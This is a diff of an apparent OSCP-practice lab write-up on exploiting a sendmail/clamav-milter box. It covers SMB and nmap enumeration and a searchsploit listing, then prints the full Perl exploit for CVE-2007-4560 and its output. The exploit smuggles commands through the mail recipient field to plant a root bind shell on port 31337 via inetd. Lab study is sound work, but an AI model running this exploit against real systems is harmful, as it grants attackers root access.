@@ -65,15 +65,15 @@ ifyoudontpwnmeuran00b
 
 ```sh
 ┌──(xavier㉿kali)-[~]
-└─$ crackmapexec smb 192.168.193.42 -u '' -p ''             
+└─$ crackmapexec smb 192.168.193.42 -u &#39;&#39; -p &#39;&#39;             
 SMB         192.168.193.42  445    NONE             [*] Unix (name:) (domain:) (signing:False) (SMBv1:True)
-SMB         192.168.193.42  445    NONE             [+] \: 
+SMB         192.168.193.42  445    NONE             [&#43;] \: 
 
 ┌──(xavier㉿kali)-[~]
-└─$ crackmapexec smb 192.168.193.42 -u '' -p '' --shares
+└─$ crackmapexec smb 192.168.193.42 -u &#39;&#39; -p &#39;&#39; --shares
 SMB         192.168.193.42  445    NONE             [*] Unix (name:) (domain:) (signing:False) (SMBv1:True)
-SMB         192.168.193.42  445    NONE             [+] \: 
-SMB         192.168.193.42  445    NONE             [+] Enumerated shares
+SMB         192.168.193.42  445    NONE             [&#43;] \: 
+SMB         192.168.193.42  445    NONE             [&#43;] Enumerated shares
 SMB         192.168.193.42  445    NONE             Share           Permissions     Remark
 SMB         192.168.193.42  445    NONE             -----           -----------     ------
 SMB         192.168.193.42  445    NONE             print$                          Printer Drivers
@@ -110,7 +110,7 @@ PORT   STATE SERVICE VERSION
 | smtp-vuln-cve2010-4344: 
 |_  The SMTP server is not Exim: NOT VULNERABLE
 | smtp-commands: localhost.localdomain Hello [192.168.45.174], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, EXPN, VERB, 8BITMIME, SIZE, DSN, ETRN, DELIVERBY, HELP
-|_ 2.0.0 This is sendmail version 8.13.4 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use "HELP <topic>". 2.0.0 To report bugs in the implementation send email to 2.0.0 sendmail-bugs@sendmail.org. 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info
+|_ 2.0.0 This is sendmail version 8.13.4 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use &#34;HELP &lt;topic&gt;&#34;. 2.0.0 To report bugs in the implementation send email to 2.0.0 sendmail-bugs@sendmail.org. 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info
 Service Info: Host: localhost.localdomain; OS: Unix
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
@@ -132,12 +132,12 @@ Nmap done: 1 IP address (1 host up) scanned in 9.83 seconds
 Clam Anti-Virus ClamAV 0.88.x - UPX Compressed PE File Heap Buffer Ov | linux/dos/28348.txt
 ClamAV / UnRAR - .RAR Handling Remote Null Pointer Dereference        | linux/remote/30291.txt
 ClamAV 0.91.2 - libclamav MEW PE Buffer Overflow                      | linux/remote/4862.py
-ClamAV < 0.102.0 - 'bytecode_vm' Code Execution                       | linux/local/47687.py
-ClamAV < 0.94.2 - JPEG Parsing Recursive Stack Overflow (PoC)         | multiple/dos/7330.c
+ClamAV &lt; 0.102.0 - &#39;bytecode_vm&#39; Code Execution                       | linux/local/47687.py
+ClamAV &lt; 0.94.2 - JPEG Parsing Recursive Stack Overflow (PoC)         | multiple/dos/7330.c
 ClamAV Daemon 0.65 - UUEncoded Message Denial of Service              | linux/dos/23667.txt
 ClamAV Milter - Blackhole-Mode Remote Code Execution (Metasploit)     | linux/remote/16924.rb
 ClamAV Milter 0.92.2 - Blackhole-Mode (Sendmail) Code Execution (Meta | multiple/remote/9913.rb
-Sendmail with clamav-milter < 0.91.2 - Remote Command Execution       | multiple/remote/4761.pl
+Sendmail with clamav-milter &lt; 0.91.2 - Remote Command Execution       | multiple/remote/4761.pl
 ---------------------------------------------------------------------- ---------------------------------
 Shellcodes: No Results
 ---------------------------------------------------------------------- ---------------------------------
@@ -153,7 +153,7 @@ Shellcodes: No Results
 ```sh
 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/8-ClamAV]
 └─$ searchsploit -m 4761 
-  Exploit: Sendmail with clamav-milter < 0.91.2 - Remote Command Execution
+  Exploit: Sendmail with clamav-milter &lt; 0.91.2 - Remote Command Execution
       URL: https://www.exploit-db.com/exploits/4761
      Path: /usr/share/exploitdb/exploits/multiple/remote/4761.pl
     Codes: CVE-2007-4560
@@ -171,24 +171,24 @@ Copied to: /home/xavier/Desktop/OSCP/PG_Practice/8-ClamAV/4761.pl
 ########################################################
 use IO::Socket;
 
-print "Sendmail w/ clamav-milter Remote Root Exploit\n";
-print "Copyright (C) 2007 Eliteboy\n";
+print &#34;Sendmail w/ clamav-milter Remote Root Exploit\n&#34;;
+print &#34;Copyright (C) 2007 Eliteboy\n&#34;;
 
-if ($#ARGV != 0) {print "Give me a host to connect.\n";exit;}
+if ($#ARGV != 0) {print &#34;Give me a host to connect.\n&#34;;exit;}
 
-print "Attacking $ARGV[0]...\n";
+print &#34;Attacking $ARGV[0]...\n&#34;;
 
-$sock = IO::Socket::INET->new(PeerAddr => $ARGV[0],
-                              PeerPort => '25',
-                              Proto    => 'tcp');
+$sock = IO::Socket::INET-&gt;new(PeerAddr =&gt; $ARGV[0],
+                              PeerPort =&gt; &#39;25&#39;,
+                              Proto    =&gt; &#39;tcp&#39;);
 
-print $sock "ehlo you\r\n";
-print $sock "mail from: <>\r\n";
-print $sock "rcpt to: <nobody+\"|echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf\"@localhost>\r\n";
-print $sock "rcpt to: <nobody+\"|/etc/init.d/inetd restart\"@localhost>\r\n";
-print $sock "data\r\n.\r\nquit\r\n";
+print $sock &#34;ehlo you\r\n&#34;;
+print $sock &#34;mail from: &lt;&gt;\r\n&#34;;
+print $sock &#34;rcpt to: &lt;nobody&#43;\&#34;|echo &#39;31337 stream tcp nowait root /bin/sh -i&#39; &gt;&gt; /etc/inetd.conf\&#34;@localhost&gt;\r\n&#34;;
+print $sock &#34;rcpt to: &lt;nobody&#43;\&#34;|/etc/init.d/inetd restart\&#34;@localhost&gt;\r\n&#34;;
+print $sock &#34;data\r\n.\r\nquit\r\n&#34;;
 
-while (<$sock>) {
+while (&lt;$sock&gt;) {
         print;
 }
 
@@ -215,10 +215,10 @@ Attacking 192.168.193.42...
 250-ETRN
 250-DELIVERBY
 250 HELP
-250 2.1.0 <>... Sender ok
-250 2.1.5 <nobody+"|echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf">... Recipient ok
-250 2.1.5 <nobody+"|/etc/init.d/inetd restart">... Recipient ok
-354 Enter mail, end with "." on a line by itself
+250 2.1.0 &lt;&gt;... Sender ok
+250 2.1.5 &lt;nobody&#43;&#34;|echo &#39;31337 stream tcp nowait root /bin/sh -i&#39; &gt;&gt; /etc/inetd.conf&#34;&gt;... Recipient ok
+250 2.1.5 &lt;nobody&#43;&#34;|/etc/init.d/inetd restart&#34;&gt;... Recipient ok
+354 Enter mail, end with &#34;.&#34; on a line by itself
 250 2.0.0 3BHCBGXD005199 Message accepted for delivery
 221 2.0.0 localhost.localdomain closing connection
 
